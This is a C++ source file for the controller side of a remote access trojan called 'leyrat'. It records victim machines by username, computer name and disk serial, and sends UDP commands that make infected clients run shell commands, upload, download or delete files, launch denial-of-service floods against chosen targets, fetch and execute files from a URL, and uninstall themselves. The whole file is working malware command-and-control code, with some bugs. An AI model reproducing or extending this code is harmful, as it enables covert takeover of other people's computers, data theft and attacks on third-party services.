
#pragma once

#include "leyrat.h"
#include "leybuf.h"
#include "leynet.h"

#include <Windows.h>
#include <stdlib.h>
#include <cstdio>

#define Log printf

extern leynet_udp net;


//client management

leyrat::leyrat()
{
	memset(onlineclients, 0, 100000);

}

leyrat::~leyrat()
{
	for (int i = 0; i < 100000; i++)
		onlineclients[i] = 0;

}


bool leyrat::IsClient(char *computername, unsigned long diskserial)
{
	HANDLE dbfileread = CreateFile("db.txt", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (!dbfileread)
		return false;


	unsigned long toread = GetFileSize(dbfileread, 0);

	char *readfile = new char[toread+1];


	unsigned long bytesread = 0;

	if (!ReadFile(dbfileread, readfile, toread, &bytesread, 0))
		return false;

	leybuf read(readfile, toread);

	while(read.GetNumBytesLeft()>0)
	{
		char slanguage[100];
		char susername[260];
		char scomputername[25];
		memset(slanguage, 0, sizeof(slanguage));
		memset(susername, 0, sizeof(susername));
		memset(scomputername, 0, sizeof(scomputername));


		int sver = read.ReadInt32();
		unsigned long sserial = read.ReadInt32();
		
		read.ReadString(slanguage, 100);
		read.ReadString(susername, 260);
		read.ReadString(scomputername, 25);

		if (!strcmp(computername, scomputername) && diskserial == sserial)
		{

			delete[] readfile;
			return true;
		}


		read.ReadChar();

	}

	delete[] readfile;
	CloseHandle(dbfileread);
	return false;
}

bool leyrat::IsOnlineClient(char *ip)
{
	for (int i = 0; i < 100000; i++)
	{
		if (!onlineclients[i])
			continue;

		if (!strcmp(ip, onlineclients[i]))
			return true;
	}

	return false;
}

void leyrat::ClientAdd(char* ip, int version, unsigned long diskserial, char* language, char* username, char*computername)
{


	if (!IsClient( computername, diskserial))
	{
		unsigned long datalen = 4 + 4 + 4 + strlen(ip) + strlen(language) + strlen(username) + strlen(computername);

		char *csave = new char[datalen];

		leybuf save(csave, datalen);

		save.WriteInt32(version);
		save.WriteInt32(diskserial);
		save.WriteString(language);
		save.WriteString(username);
		save.WriteString(computername);
		save.WriteChar('\n');

		unsigned long written;

		HANDLE dbfilewrite = CreateFile("db.txt", FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (!dbfilewrite)
			return;

		int wrotefile = WriteFile(dbfilewrite, csave, save.GetPos(), &written, 0);

		CloseHandle(dbfilewrite);

		if (!wrotefile)
		{
			return;
		}


	}


	for (int i = 0; i < 100000; i++)
	{
		if (!onlineclients[i])
			onlineclients[i] = ip;
	}


}

bool leyrat::GetClientCountry(char* computername, unsigned long diskserial, char *cbuf)
{
	HANDLE dbfileread = CreateFile("db.txt", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (!dbfileread)
		return false;


	unsigned long toread = GetFileSize(dbfileread, 0);

	char *readfile = new char[toread + 1];


	unsigned long bytesread = 0;

	if (!ReadFile(dbfileread, readfile, toread, &bytesread, 0))
		return false;

	leybuf read(readfile, toread);

	while (read.GetNumBytesLeft()>0)
	{
		char slanguage[100];
		char susername[260];
		char scomputername[25];
		memset(slanguage, 0, sizeof(slanguage));
		memset(susername, 0, sizeof(susername));
		memset(scomputername, 0, sizeof(scomputername));


		int sver = read.ReadInt32();
		unsigned long sserial = read.ReadInt32();

		read.ReadString(slanguage, 100);
		read.ReadString(susername, 260);
		read.ReadString(scomputername, 25);

		if (!strcmp(computername, scomputername) && diskserial == sserial)
		{
			strcpy(cbuf, slanguage);
			delete[] readfile;
			return true;
		}


		read.ReadChar();

	}

	delete[] readfile;
	CloseHandle(dbfileread);

	return true;
}

bool leyrat::GetClientUsername(char* computername, unsigned long diskserial, char *cbuf)
{
	HANDLE dbfileread = CreateFile("db.txt", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (!dbfileread)
		return false;


	unsigned long toread = GetFileSize(dbfileread, 0);

	char *readfile = new char[toread + 1];


	unsigned long bytesread = 0;

	if (!ReadFile(dbfileread, readfile, toread, &bytesread, 0))
		return false;

	leybuf read(readfile, toread);

	while (read.GetNumBytesLeft()>0)
	{
		char slanguage[100];
		char susername[260];
		char scomputername[25];
		memset(slanguage, 0, sizeof(slanguage));
		memset(susername, 0, sizeof(susername));
		memset(scomputername, 0, sizeof(scomputername));


		int sver = read.ReadInt32();
		unsigned long sserial = read.ReadInt32();

		read.ReadString(slanguage, 100);
		read.ReadString(susername, 260);
		read.ReadString(scomputername, 25);

		if (!strcmp(computername, scomputername) && diskserial == sserial)
		{
			strcpy(cbuf, scomputername);
			delete[] readfile;
			return true;
		}


		read.ReadChar();

	}

	delete[] readfile;
	CloseHandle(dbfileread);

	return true;
}

bool leyrat::GetClientVersion(char* computername, unsigned long diskserial, unsigned long* version)
{
	HANDLE dbfileread = CreateFile("db.txt", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (!dbfileread)
		return false;


	unsigned long toread = GetFileSize(dbfileread, 0);

	char *readfile = new char[toread + 1];


	unsigned long bytesread = 0;

	if (!ReadFile(dbfileread, readfile, toread, &bytesread, 0))
		return false;

	leybuf read(readfile, toread);

	while (read.GetNumBytesLeft()>0)
	{
		char slanguage[100];
		char susername[260];
		char scomputername[25];
		memset(slanguage, 0, sizeof(slanguage));
		memset(susername, 0, sizeof(susername));
		memset(scomputername, 0, sizeof(scomputername));


		int sver = read.ReadInt32();
		unsigned long sserial = read.ReadInt32();

		read.ReadString(slanguage, 100);
		read.ReadString(susername, 260);
		read.ReadString(scomputername, 25);

		if (!strcmp(computername, scomputername) && diskserial == sserial)
		{
			*version = sver;
			delete[] readfile;
			return true;
		}


		read.ReadChar();

	}

	delete[] readfile;
	CloseHandle(dbfileread);

	return true;
}

//requests

void leyrat::Request_AckServer(char* ip, short port)
{
	Log("[S][%s] Requesting AckServer!\n", ip);
	

	char bpkg[100];

	leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('a');

	net.SendTo(ip, port, bpkg, buf.GetPos());

}

void leyrat::Request_RunCmd(char* ip, short port, char*torun)
{
	Log("[S][%s] Requesting RunCmd :: %s!\n", torun, ip);

	char bpkg[1024];

	leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('b');
	buf.WriteChar(0);//show
	buf.WriteString(torun);

	net.SendTo(ip, port, bpkg, buf.GetPos());

}

void leyrat::Request_FileList(char* ip, short port, char*dir )
{

	Log("[S][%s] Requesting FileList!\n", ip);

	char bpkg[512];

	leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('c');
	buf.WriteString(dir);

	net.SendTo(ip, port, bpkg, buf.GetPos());
}

void leyrat::Request_FileDownload(const char* ip, short port, const char*file,  void*data, int datalen)
{

	Log("[S][%s] Requesting FileDownload!\n", ip);

    char *bpkg = new char[0xFFFF];

    leybuf buf(bpkg, 0xFFFF);
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('d');
    buf.WriteString(file);
    buf.WriteBytes(data, datalen);

	net.SendTo(ip, port, bpkg, buf.GetPos());

    delete[] bpkg;
}

void leyrat::Request_FileDelete(char* ip, short port, char*file)
{

	Log("[S][%s] Requesting FileDelete!\n", ip);

	char bpkg[100];

	leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('d');
	buf.WriteString(file);

	net.SendTo(ip, port, bpkg, buf.GetPos());
}

void leyrat::Request_FileUpload(char* ip, short port, char*file)
{
	Log("[S][%s] Requesting FileUpload!\n", ip);

	char bpkg[512];

	leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('e');
	buf.WriteString(file);

	net.SendTo(ip, port, bpkg, buf.GetPos());
}

void leyrat::Request_Dos(char* ip, short port, char* addr, char* pkg, unsigned char pkglen, unsigned int time, short atkport, bool is_http)
{
	Log("[S][%s] Requesting Dos!\n", ip);

	char bpkg[0xFFF];

	leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('g');
	buf.WriteInt32(time);

	if (time == 0)
	{
		net.SendTo(ip, port, bpkg, buf.GetPos());
		return;
	}


	buf.WriteChar((char)!is_http);
	buf.WriteString(addr);
	buf.WriteInt32(atkport);
	buf.WriteChar(pkglen);
	buf.WriteBytes(pkg, pkglen);
	

	net.SendTo(ip, port, bpkg, buf.GetPos());

}

void leyrat::Request_Screenshare(char* ip, short port)
{
	Log("[S][%s] Requesting Screenshare!\n", ip);
}

void leyrat::Request_ScreenshareInput(char* ip, short port)
{
	Log("[S][%s] Requesting Screenshare input!\n", ip);
}

void leyrat::Request_HTTPDownload(char* ip, short port, char*url, char*store, bool exec, bool update)
{

	Log("[S][%s] Requesting http download!\n", ip);

    char addr[255];
    char file[255];

    unsigned int add_tofile = 0;

    for(unsigned int i=0;i<strlen(url);i++)
    {
        if(!add_tofile&&i>2&&url[i]=='/'&&url[i-1]!='/')
        {
            add_tofile = i;
            addr[i]=0;
        }

        if(!add_tofile)
            addr[i] = url[i];
        else
            file[i-add_tofile] = url[i];
    }

	char extras = 0;

	if (update)
		extras = 2;

	if (exec)
		extras = 1;

	char bpkg[0xFFF];

	leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('1');
	
	buf.WriteString(addr);
	buf.WriteString(file);
	buf.WriteString(store);
	buf.WriteChar(extras);

	net.SendTo(ip, port, bpkg, buf.GetPos());
}

void leyrat::Request_Suicide(char* ip, short port)
{
	Log("[S][%s] Requesting suicide!\n", ip);

	char bpkg[100];

	leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('2');

	net.SendTo(ip, port, bpkg, buf.GetPos());
}


//callbacks

void leyrat::Callback_AckServer(char* ip, int version, unsigned long diskserial, char* language, char* username, char*computername)
{
	Log("[R][%s] Acknowledged Server!\n", ip);
}

void leyrat::Callback_RunCmd(char* ip)
{
	Log("[R][%s] Ran cmd!\n", ip);
}

void leyrat::Callback_FileList(char* ip, char**files, int numfiles)
{

	Log("[R][%s] Listed files!\n", ip);
}

void leyrat::Callback_FileDownload(char* ip)
{

	Log("[R][%s] Downloaded file!\n", ip);

}

void leyrat::Callback_FileDelete(char* ip)
{

	Log("[R][%s] Deleted file!\n", ip);

}

void leyrat::Callback_FileUpload(char* ip, char*filename, char*bytes, int len)
{
	Log("[R][%s] Uploaded file!\n", ip);
}

void leyrat::Callback_Dos(char* ip)
{

	Log("[R][%s] Started dos!\n", ip);
}

void leyrat::Callback_Screenshare(char* ip)
{

	Log("[R][%s] Screenshare!\n", ip);
}

void leyrat::Callback_ScreenshareInput(char* ip)
{

	Log("[R][%s] Screenshare input!\n", ip);
}

void leyrat::Callback_HTTPDownload(char* ip)
{

	Log("[R][%s] Received http download!\n", ip);
}

void leyrat::Callback_Suicide(char* ip)
{

	Log("[R][%s] Removed rat!\n", ip);
}

